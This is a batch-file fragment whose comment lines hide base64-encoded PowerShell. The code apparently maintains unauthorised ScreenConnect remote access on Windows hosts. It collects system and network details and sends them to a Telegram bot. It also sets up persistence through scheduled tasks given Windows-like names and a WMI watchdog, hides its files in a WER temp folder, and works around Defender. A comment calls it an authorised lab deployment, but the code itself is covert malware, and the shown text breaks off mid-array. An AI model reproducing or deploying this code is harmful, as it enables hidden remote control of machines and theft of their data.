::IENsaWVudCoiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVj
::dCBDbGllbnQqIiAtRGlyZWN0b3J5IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlIHwNCiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbm90bWF0Y2gg
::KCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
::LUdyeXhhS2VlcEZwKSkgfSkNCiAgICAkZGlhZ0xpbmVzID0gTmV3LU9iamVjdCBT
::eXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10NCiAgICAkYm9v
::dFBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KICAgIGlmIChU
::ZXN0LVBhdGggJGJvb3RQYXRoKSB7DQogICAgICAgICRpbnRlcmVzdGluZyA9IEAo
::DQogICAgICAgICAgICAnbXNpXycsICdmZXRjaF8nLCAncHJpbWFyeV8nLCAnbnVr
::ZV8nLCAnbXNpX3RvbycsICdtc2lfZmV0Y2gnLCAnbXNpX2V4aXQnLA0KICAgICAg
::ICAgICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRl
::cm1pbmF0ZV8nLCAnaWRlbnRpdHlfJywNCiAgICAgICAgICAgICdjcmVhdGVfdGFz
::aycsICd2ZXJpZnlfdGFzaycsICdvcnBoYW5fJywgJ3N0YWxlXycsICdwb3N0aW5z
::dGFsbCcsICdhbHRfJw0KICAgICAgICApDQogICAgICAgIEdldC1Db250ZW50IC1M
::aXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICAg
::ICAkbGluZSA9ICRfDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGlu
::dGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0
::cnVlIH0gfQ0KICAgICAgICAgICAgICAgICRmYWxzZQ0KICAgICAgICAgICAgfSB8
::DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2IHwNCiAgICAgICAg
::ICAgIEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoKCctIDxj
::b2RlPnswfTwvY29kZT4nIC1mIChFc2MgKCRfIC1yZXBsYWNlICdbXlx4MjAtXHg3
::RV0nLCAnPycpKSkpIH0NCiAgICB9DQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQg
::LWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVr
::ZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0NCiAgICAkZGVwbG95QmxvY2sgPSBA
::Ig0KDQo8Yj5EZXBsb3kgdmVyZGljdDwvYj4NCi0gUmVzdWx0OiA8Yj4kKEVzYyAk
::dmVyZGljdCk8L2I+DQotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHByaW1Paykg
::eyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIE1vbml0b3Igc2NyaXB0ICgud3Vj
::YWNoZVxvd25fbW9uLmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNl
::IHsgJ05PJyB9KQ0KLSBCYWNrdXAgbW9uICguZXRsY2FjaGVcZXRsX21vbi5jbWQp
::OiAkKGlmICgkaGFzRXRsKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0gUGVy
::c2lzdCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVjdGVkVGFza3MuQ291bnQp
::IChiYWQvbWlzc2luZzogJHRhc2tCYWQpDQotIE1TSSBjYWNoZTogJChFc2MgJG1z
::aVNpemUpDQotIEZvcmVpZ24gU0MgZm9sZGVycyBsZWZ0OiAkKCRmb3JlaWduLkNv
::dW50KQ0KLSBOb3RlOiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBy
::dW4gKG5vcm1hbCByaWdodCBhZnRlciBjcmVhdGUpDQoNCjxiPkRlcGxveSBsb2cg
::bWFya2VyczwvYj4NCiQoJGRpYWdMaW5lcyAtam9pbiAiYG4iKQ0KIkANCn0NCg0K
::JGdkcm9wQmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdHRFJPUCcpIHsNCiAgICAk
::Y2F1c2VQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdkcm9wX2xhc3RfcmVhc29u
::LnR4dCcNCiAgICAkY2F1c2UgPSBpZiAoVGVzdC1QYXRoICRjYXVzZVBhdGgpIHsg
::KEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2F1c2VQYXRoIC1Ub3RhbENvdW50
::IDEpIH0gZWxzZSB7ICRTdW1tYXJ5IH0NCiAgICAkZXZMaW5lcyA9IE5ldy1PYmpl
::Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAg
::JGV2RGlyID0gSm9pbi1QYXRoICRXb3JrRGlyICdkcm9wX2V2ZW50cycNCiAgICAk
::bGF0ZXN0ID0gJG51bGwNCiAgICBpZiAoVGVzdC1QYXRoICRldkRpcikgew0KICAg
::ICAgICAkbGF0ZXN0ID0gR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGV2RGly
::IC1GaWx0ZXIgJ2Ryb3BfKi50eHQnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlIHwNCiAgICAgICAgICAgIFNvcnQtT2JqZWN0IExhc3RXcml0ZVRpbWUgLURl
::c2NlbmRpbmcgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIGlm
::ICgkbGF0ZXN0KSB7DQogICAgICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAk
::bGF0ZXN0LkZ1bGxOYW1lIC1Ub3RhbENvdW50IDQ1IC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIEZvckVhY2gtT2JqZWN0IHsgW3Zv
::aWRdJGV2TGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+JyAtZiAoRXNjICgo
::JF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkpIH0NCiAgICB9DQog
::ICAgaWYgKCRldkxpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRldkxpbmVzLkFk
::ZCgnLSAobm8gZHJvcF9ldmVudHMgZmlsZSB5ZXQpJykgfQ0KICAgICRnZHJvcEJs
::b2NrID0gQCINCg0KPGI+R3J5eGEgRFJPUCBjYXVzZTwvYj4NCi0gQ0FVU0U6IDxi
::PiQoRXNjICRjYXVzZSk8L2I+DQotIEV2aWRlbmNlIGZpbGU6IDxjb2RlPiQoRXNj
::ICQoaWYgKCRsYXRlc3QpIHsgJGxhdGVzdC5GdWxsTmFtZSB9IGVsc2UgeyAnbi9h
::JyB9KSk8L2NvZGU+DQoNCjxiPkV2aWRlbmNlIChmaXJzdCBsaW5lcyk8L2I+DQok
::KCRldkxpbmVzIC1qb2luICJgbiIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1v
::amkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+DQoNCjxiPkV2ZW50
::PC9iPg0KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkNCi0gVHJhbnNpdGlvbjog
::PGNvZGU+JChFc2MgJHRyYW5zKTwvY29kZT4NCi0gV2hlbjogJChFc2MgJG5vdykN
::Ci0gU291cmNlIGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPg0KJGRl
::cGxveUJsb2NrJGdkcm9wQmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6
::IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjog
::PGNvZGU+JChFc2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZ
::U1RFTTogJGlzU3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5E
::b21haW4pDQoNCjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNj
::ICRsYW4pPC9jb2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9j
::b2RlPg0KDQo8Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNh
::cHRpb24pDQotIFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChF
::c2MgJG9zLkJ1aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNj
::ICRvcy5JbnN0YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9v
::dCkNCi0gVXB0aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5D
::UFUpDQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAk
::b3MuTW9kZWwpDQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2Nv
::ZGU+DQotIFJBTTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgk
::b3MuRGlza0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IN
::Cg0KPGI+U2NyZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2
::MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxj
::b2RlPmY4NjFjODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCi0g
::R3J5eGEgPGNvZGU+JChFc2MgKEdldC1Hcnl4YUtlZXBGcCkpPC9jb2RlPjogJChF
::c2MgKEdldC1TdmNMaW5lICgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKHswfSkiIC1m
::IChHZXQtR3J5eGFLZWVwRnApKSkpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0K
::PGI+T3RoZXIgUk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9p
::biAiYG4iKQ0KDQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0
::YXNrTGluZXMgLWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNo
::ZTogJChFc2MgJG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3Jr
::RGlyKTwvY29kZT4NCg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0
::aGlzIGhvc3QpPC9iPg0KLSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBU
::R1I9JGJUZ3IgfCBMSUI9JGJMaWI8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRl
::PC9iPg0KLSA8Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4NCg0KPGk+Qm90
::OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMg
::Y29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAo
::aG91cmx5IGhlYXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQog
::ICAgJGZvcmVpZ25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVP
::YmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5D
::b3VudCB9DQogICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUp
::IHsgJ3swOk4wfUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxl
::bmd0aCAvIDFLQikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYg
::KCRwcmltT2spIHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9y
::dCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNl
::IHsgJy0nIH0NCiAgICAkZ3J5eGFMaW5lID0gR2V0LVN2Y0xpbmUgKCJTY3JlZW5D
::b25uZWN0IENsaWVudCAoezB9KSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkpDQogICAg
::JGdyeXhhU2hvcnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7
::ICdPSycgfSBlbHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQo
::JGVudjpDT01QVVRFUk5BTUUpfHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9y
::dHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25OfHQ9JHRhc2tPay81fGI9JEJ1aWxk
::Ig0KfQ0KDQppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhp
::dHMgPSBAKCgkcm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAo
::Jy0gLi4uICh7MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAg
::ICAkc2NMaXN0ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0
::KSkgKyAoJy0gLi4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQp
::KQ0KICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48
::aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxv
::ZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5k
::LVRnKFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2Fk
::ID0gQHsNCiAgICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5D
::SEFUX0lEDQogICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cN
::CiAgICAgICAgZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9
::DQogICAgaWYgKCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9
::DQogICAgJGpzb24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVz
::cyAtRGVwdGggNQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106
::OlVURjguR2V0Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVy
::aSAoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VO
::KS9zZW5kTWVzc2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRi
::eXRlcyAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRm
::LTgnIHwgT3V0LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmlu
::Z10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAg
::ICB0cnkgew0KICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9k
::ZQ0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAg
::dHJ5IHsNCiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJp
::bmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUN
::CiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAg
::ICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0K
::dHJ5IHsNCiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRN
::TCcpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
::bHVlICd0Z19zZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::DQogICAgfSBlbHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAg
::IH0NCiAgICBpZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIg
::KyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::ICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGly
::ICdkZXBsb3lfdGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycp
::IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7
::DQogICAgdHJ5IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgk
::dGV4dCwgJzxbXj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5O
::ZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAo
::JHBsYWluLkxlbmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3Ry
::aW5nKDAsIDM1MDApICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdT
::YWZlIC1tc2cgJHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRk
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWlu
::JyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0K
::ICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0
::Z19mYWlsICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNDgNCiMgTDQ4OiBIRUFMVEhZIHJlcXVpcmVzIGdyeXhhLmNvbSBJbWFnZVBh
::dGggKGJhcmUgc2MgY3JlYXRlIHdhcyBmYWxzZSBIRUFMVEhZIOKGkiBIRUFMIC94
::IGtpbGxlZCBHdWVzdHMpLg0KIyBMNDc6IHNjLmV4ZSBmb3IgU0MgZXhpc3RlbmNl
::L3J1bm5pbmcgKEdldC1TZXJ2aWNlIGZhbHNlIEFCU0VOVCBjYXVzZWQgYmFkIGhl
::YWxzKS4NCiMgTDQ2OiBGUkVFWkUgLSBuZXZlciBhdXRvIG1zaWV4ZWMgZnJvbSBt
::b24vYm9vdDsgc3RhcnQtb25seS4gTWFudWFsIGZvcmNlIG9ubHkuDQojIEw0NTog
::SEFORFMtT0ZGIGFsbCBTY3JlZW5Db25uZWN0IGV4Y2VwdCBHcnl4YSBpbnN0YWxs
::LWlmLWFic2VudC4NCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5
::IChhbnRpLXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZw0KIyAobXV0dWFsIHBlcnNp
::c3RlbmNlIGNoYWluKSwgY2FtcGFpZ24gc3RhdGUgZmlsZSwgU0Mgc2VydmljZSBy
::ZXBhaXIuDQojIEw0NDogSEFSRCBsb2NrIOKAlCBhbnkgbGl2ZSBHcnl4YSA9PiBu
::ZXZlciBtaWdyYXRlL3VuaW5zdGFsbC9pOyBubyBkZWZlcnJlZCAveDsgcHJvdGVj
::dCBtdXN0IGVtcHR5IFVwZ3JhZGUuDQojIEw0MzogVGVzdC1TY1J1bm5pbmcgaW5j
::bHVkZXMgU3RhcnRQZW5kaW5nOyBuZXZlciAveCB3aGVuIHNlcnZpY2UgZXhpc3Rz
::IChjb25uZWN0LWRyb3AgcmFjZSkuDQojIEw0MjogRlAgbWlncmF0ZSBpbnN0YWxs
::LW5ldy1GSVJTVCB0aGVuIGRlZmVyLXJlbW92ZS1vbGQgKG5ldmVyIGxlYXZlIGhv
::c3Qgd2l0aCB6ZXJvIEdyeXhhKS4NCiMgTDQxOiAtRm9yY2UgTkVWRVIgL3grL2kg
::d2hlbiBHcnl4YSBhbHJlYWR5IFJ1bm5pbmcgKGZvcmNlX2dyeXhhLmZsYWcgd2Fz
::IGtpbGxpbmcgbGl2ZSBHdWVzdCkuDQojIEwzOTogcmVsYXktdmVyaWZpZWQgR3J5
::eGEga2VlcGVyIGFkb3B0aW9uOyBJTkZMSUdIVOKJoEhFQUxUSFk7IHJlYWwgLUZv
::cmNlLy1EZWVwOw0KIyAgICAgIHBvc3QtR3J5eGEgL2kgc2V2cnogcmVzdG9yZTsg
::VGVzdC1Nc2lQYWNrYWdlOyBUQVNLX0cgaW4gc3RhdGU7IHBlcnNpc3RlbmNlIHB1
::cmdlIHcvbyBGUC1vbmx5Lg0KIyBMMzg6IFRBU0tfRyBXdWNhY2hlR3J5eGFCb290
::IE9OU1RBUlQgcnVucyBncnl4YS1lbnN1cmUgLU5vV2FpdCAtRm9yY2UgYXQgYm9v
::dCAoRGVmZW5kZXIgc3RyaXBzIFNDTSBlbnRyeSBhdCBzdGFydHVwKS4gTDM3OiBN
::U0kgbWFnaWMrRlAgdmFsaWRhdGUuDQojIEwyMTogc3R1Y2sgcmVnaXN0ZXJlZCAo
::c3ZjK2RpciBnb25lKSAtPiAvZmEgdGhlbiBBUlAgbnVrZSArIHNhbWUtRlAgL2k7
::IHJldHVybiBmaXguDQojIEwyMDogLURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBz
::dGFydC9yZXBhaXIgKHJhdGUtbGltaXQgbGVmdCBHcnl4YSBTdG9wcGVkKS4NCiMg
::TDE5OiByYXRlLWxpbWl0IG5ldmVyIGJsb2NrcyB3aGVuIEdyeXhhIGZ1bGx5IGFi
::c2VudDsgU3RhcnRQZW5kaW5nIGtlZXAuDQojIEwxODogZXh0ZXJtaW5hdGUgd2Fz
::IEtJTExJTkcgR3J5eGEgKG51bGwtcGF0aCBwcm9jIGtpbGwpOyBzeW5jIEZQIGJl
::Zm9yZSBraWxsLg0KIyBMMTc6IEdyeXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxlIGFu
::eSBub24tc2V2cnogU0MgUnVubmluZzsgRlAgZHJpZnQgbmV2ZXIgL3guDQojIEwx
::NjogTkVWRVIgcmVpbnN0YWxsIEdyeXhhIHdoZW4gUnVubmluZyAocGFuZWwgZHVw
::bGljYXRlcyk7IFRDUCBhZHZpc29yeSBvbmx5Lg0KIyBMMTU6IGdyeXhhLWhlYWx0
::aCAvIGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVjayAoVENQL3JlbGF5L0ZQ
::IGRyaWZ0IHJlaW5zdGFsbCkuDQojIEwxMzogc2NodGFza3MgQ3JlYXRlIHZpYSBj
::bWQgKGxpa2UgV3VjYWNoZU93biksIFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwud3Vj
::YWNoZQ0KIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwg
::L1NUIDAwOjAwIG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLg0KIyBMMTI6IElERU5U
::VkVSPTcgUk9PVC1sZXZlbCB0YXNrIG5hbWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdp
::bmRvd3MgQWNjZXNzIERlbmllZCkuDQojIEwxMTogTkVWRVIgcmV1c2UgcmVhbCBX
::aW5kb3dzIGJ1aWx0LWluIHRhc2sgbmFtZXM7IFRSIG93bmVyc2hpcCBjaGVja3Mu
::DQojIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRp
::dGlvbiBzY29wZSBvbmx5Lg0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZANCltDbWRsZXRCaW5kaW5nKCldDQpwYXJhbSgNCiAg
::ICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICBbVmFsaWRhdGVT
::ZXQoJ2luaXQnLCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tz
::LWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0
::ZXJlZCcsICdleHRlcm1pbmF0ZScsICdncnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5z
::dXJlJywgJ3N5bmMtZ3J5eGEtZnAnLCAndGVzdC1tc2knLCAncHJvdGVjdC1tc2kn
::LCAndmVyaWZ5LXVwZGF0ZScsICdzeW5jLXNldnJ6LWZwJyldDQogICAgW3N0cmlu
::Z10kQWN0aW9uLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURh
::dGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtz
::dHJpbmddJE1vblBhdGggPSAnJywNCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1
::JywNCiAgICBbc3RyaW5nXSRFeHRyYSAgPSAnJywNCiAgICBbc3RyaW5nXSRGcCAg
::ICAgPSAnJywNCiAgICBbc3dpdGNoXSREZWVwLA0KICAgIFtzd2l0Y2hdJEZvcmNl
::LA0KICAgIFtzd2l0Y2hdJE5vV2FpdA0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJl
::bmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokY2ZnUGF0aCA9IEpvaW4tUGF0aCAk
::V29ya0RpciAnaWRlbnRpdHkuY2ZnJw0KJElkZW50VmVyc2lvbiA9IDgNCg0KIyBS
::b290LWxldmVsIG5hbWVzIFdJVEhPVVQgbGVhZGluZyBiYWNrc2xhc2ggKG1hdGNo
::ZXMgd29ya2luZyBXdWNhY2hlT3duIHN0eWxlKS4NCiRQb29scyA9IEB7DQogICAg
::QSA9IEAoJ1dlclF1ZXVlU3luYycsJ0RpYWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNh
::Y2hlJywnV2RpSG9zdFByb3h5JywnUGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25m
::bGljdFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykNCiAgICBC
::ID0gQCgnUGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnV2VyUXVldWVT
::eW5jJywnTmV0VHJhY2VDYWNoZScsJ0RpYWdIb3N0Q2FjaGUnLCdUY3BJcENvbmZs
::aWN0UmVzJywnUGxhU2VydmVyRGlhZycsJ1NyQ2FjaGVTeW5jJykNCiAgICBDID0g
::QCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxp
::Y3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9z
::dENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpDQogICAgRCA9
